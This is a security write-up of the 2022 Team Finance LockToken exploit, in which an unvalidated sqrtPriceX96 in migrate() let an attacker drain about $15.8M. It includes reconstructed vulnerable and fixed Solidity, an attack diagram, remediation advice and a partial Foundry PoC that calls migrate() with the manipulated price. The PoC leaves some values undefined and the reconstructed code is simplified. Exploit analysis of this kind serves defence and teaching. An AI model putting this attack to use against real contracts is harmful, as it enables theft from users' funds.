# TeamFinance — migrate() sqrtPriceX96 Parameter Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10-27 |
| **Protocol** | Team Finance (LockToken) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$15.8M (multiple tokens: USDC, DAI, CAW, TSUKA, etc.) |
| **Vulnerable Contract** | [0x48d118c9185e4dbafe7f3813f8f29ec8a6248359](https://etherscan.io/address/0x48d118c9185e4dbafe7f3813f8f29ec8a6248359) (LockToken) |
| **Attack Contract** | [0xcff07c4e6aa9e2fec04daaf5f41d1b10f3adadf4](https://etherscan.io/address/0xcff07c4e6aa9e2fec04daaf5f41d1b10f3adadf4) |
| **Attacker** | [0x161cebb807ac181d5303a4ccec2fc580cc5899fd](https://etherscan.io/address/0x161cebb807ac181d5303a4ccec2fc580cc5899fd) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **DAI** | [0x6B175474E89094C44Da98b954EedeAC495271d0F](https://etherscan.io/address/0x6B175474E89094C44Da98b954EedeAC495271d0F) |
| **CAW** | [0xf3b9569F82B18aEf890De263B84189bd33EBe452](https://etherscan.io/address/0xf3b9569F82B18aEf890De263B84189bd33EBe452) |
| **TSUKA** | [0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD](https://etherscan.io/address/0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD) |
| **Root Cause** | The `migrate()` function does not validate the `sqrtPriceX96` parameter, allowing an arbitrary price range to be set when creating a Uniswap V3 position |
| **CWE** | CWE-20: Improper Input Validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/TeamFinance_exp.sol) |

---
## 1. Vulnerability Overview

Team Finance's LockToken contract provided a `migrate()` function to migrate Uniswap V2 LP positions to Uniswap V3. This function accepted the `sqrtPriceX96` initial price parameter required for V3 position creation as user input and used it without validation. The attacker locked 4 V2 LP positions, then called `migrate()` while passing an extremely distorted `sqrtPriceX96` value (`79210883607084793911461085816`). This caused V3 positions to be created with a severely skewed price range, allowing the attacker to extract liquidity in a biased manner and realize enormous profits.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable migrate() - sqrtPriceX96 parameter not validated
contract LockToken {
    struct MigrateParams {
        uint256 lockId;
        uint256 sqrtPriceX96;   // ❌ User can set arbitrary value
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }

    function migrate(MigrateParams calldata params) external nonReentrant {
        LockInfo storage lock = lockInfo[params.lockId];
        require(msg.sender == lock.owner, "Not owner");

        // Remove V2 LP
        IUniswapV2Pair(lock.lpToken).burn(address(this));

        // ❌ sqrtPriceX96 used as V3 initial price without validation
        // Normal range: sqrt(actual price) * 2^96
        // Attacker can extract large amounts of one token using an extreme value
        IUniswapV3Factory(v3Factory).createPool(token0, token1, fee);
        IUniswapV3Pool(pool).initialize(uint160(params.sqrtPriceX96));

        // Add V3 position - imbalanced liquidity due to distorted initial price
        INonfungiblePositionManager(nfpm).mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                fee: fee,
                tickLower: params.tickLower,
                tickUpper: params.tickUpper,
                amount0Desired: amount0,
                amount1Desired: amount1,
                amount0Min: params.amount0Min,
                amount1Min: params.amount1Min,
                recipient: lock.owner,
                deadline: params.deadline
            })
        );
    }
}

// ✅ Correct pattern - compute sqrtPriceX96 from current V2 price
contract SafeLockToken {
    function migrate(MigrateParams calldata params) external nonReentrant {
        LockInfo storage lock = lockInfo[params.lockId];
        require(msg.sender == lock.owner, "Not owner");

        // Remove V2 LP and verify actual reserve ratio
        (uint256 amount0, uint256 amount1) = IUniswapV2Pair(lock.lpToken).burn(address(this));

        // ✅ Compute sqrtPriceX96 from current V2 reserve ratio (ignore user input)
        uint160 computedSqrtPriceX96 = _computeSqrtPriceX96(amount0, amount1);

        // ✅ Only create V3 position if within acceptable tolerance
        uint256 priceBound = 2; // 2% tolerance
        require(
            params.sqrtPriceX96 >= computedSqrtPriceX96 * (100 - priceBound) / 100 &&
            params.sqrtPriceX96 <= computedSqrtPriceX96 * (100 + priceBound) / 100,
            "Price out of range"
        );

        IUniswapV3Pool(pool).initialize(computedSqrtPriceX96);
        // ... create V3 position
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**LockToken_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `migrate()` function does not validate the `sqrtPriceX96` parameter, allowing an arbitrary price range to be set when creating a Uniswap V3 position
    function migrate(uint256 arg0, (address,uint256,uint8,address,address,uint24,int24,int24,uint256,uint256,address,uint256,bool) arg1, bool arg2, uint160 arg3, bool arg4) external view returns (uint256) {}  // 0xb86f3ea6  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Lock 4 V2 LP positions in LockToken (lockToken)
    │       Obtain NFT IDs
    │
    ├─[2] Call extendLockDuration() (4 NFTs)
    │       Maintain valid lock state
    │
    ├─[3] Call migrate() (4 times, once per V2 LP)
    │       params.sqrtPriceX96 = 79210883607084793911461085816 (manipulated value)
    │       ❌ No input validation
    │       │
    │       ├─ Burn V2 LP → receive token0, token1
    │       ├─ Create + initialize V3 Pool (distorted price)
    │       └─ Mint V3 position → deposit large amount of one token only
    │           → remaining token returned to attacker as "residual"
    │
    ├─[4] Remove liquidity from V3 position
    │       Extract large amount of one token via distorted price
    │
    ├─[5] USDC → DAI (Curve 3pool swap)
    │
    └─[6] Net profit: ~$15.8M (USDC, DAI, CAW, TSUKA, etc.)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ILockToken {
    struct MigrateParams {
        uint256 lockId;
        uint256 sqrtPriceX96;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }

    function lockToken(
        address lpToken,
        address owner,
        uint256 amount,
        uint256 unlockDate,
        bool countryCheck,
        string calldata feeName
    ) external payable returns (uint256);

    function extendLockDuration(uint256 id, uint256 newUnlockDate) external;
    function migrate(MigrateParams calldata params) external;
}

contract TeamFinanceExploit is Test {
    ILockToken lockToken = ILockToken(0x48d118c9185e4dbafe7f3813f8f29ec8a6248359);

    uint256[] lockIds = new uint256[](4);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_837_893);
    }

    function testExploit() public {
        // [Step 1] Lock 4 V2 LP positions
        for (uint256 i = 0; i < 4; i++) {
            address lpToken = targetPairs[i];
            lockIds[i] = lockToken.lockToken{value: fee}(
                lpToken,
                address(this),
                lpAmount[i],
                block.timestamp + 1 days,
                false,
                "free"
            );
        }

        // [Step 2] Extend lock duration
        for (uint256 i = 0; i < 4; i++) {
            lockToken.extendLockDuration(lockIds[i], block.timestamp + 2 days);
        }

        // [Step 3] migrate() - manipulated sqrtPriceX96
        for (uint256 i = 0; i < 4; i++) {
            lockToken.migrate(ILockToken.MigrateParams({
                lockId: lockIds[i],
                // ⚡ Extremely distorted initial price: thousands of times off from actual price
                sqrtPriceX96: 79210883607084793911461085816,
                tickLower: -887220,
                tickUpper: 887220,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp + 1
            }));
        }

        // [Step 4] Withdraw liquidity from V3 position + swap tokens
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | migrate() sqrtPriceX96 parameter not validated |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | AMM Price Manipulation |
| **Attack Vector** | `migrate(sqrtPriceX96=manipulated value)` → distorted V3 Pool initialization → biased liquidity extraction |
| **Precondition** | `migrate()` function does not validate the V3 initial price parameter |
| **Impact** | ~$15.8M loss across multiple tokens |

---
## 6. Remediation Recommendations

1. **Validate sqrtPriceX96 range**: Verify that the value falls within an acceptable tolerance (e.g., ±2%) of the theoretical price computed from the current V2 reserve ratio.
2. **Derive price from V2 reserves**: Do not trust the user-supplied `sqrtPriceX96`; instead compute the V3 initial price based on the actual amount0/amount1 ratio obtained from burning the V2 LP.
3. **Pause migration**: Establish a procedure to thoroughly test the `migrate()` function and enable it in a phased rollout.

---
## 7. Lessons Learned

- **Complexity of migration functions**: V2 → V3 migration is a complex operation requiring a solid understanding of AMM mathematics (sqrtPriceX96, ticks). Exposing external library parameters directly to user input inevitably creates a manipulation vector.
- **Significance of AMM initial price**: The `initialize(sqrtPriceX96)` call on a Uniswap V3 Pool determines the pool's initial price. If this price is distorted, the first liquidity provider can deposit and withdraw tokens at an arbitrary price ratio.
- **Risks of locked LP positions**: Token locking services do not end at simply holding LP tokens. Each ancillary feature — migration, extension, etc. — can independently become an attack vector and must be recognized as such.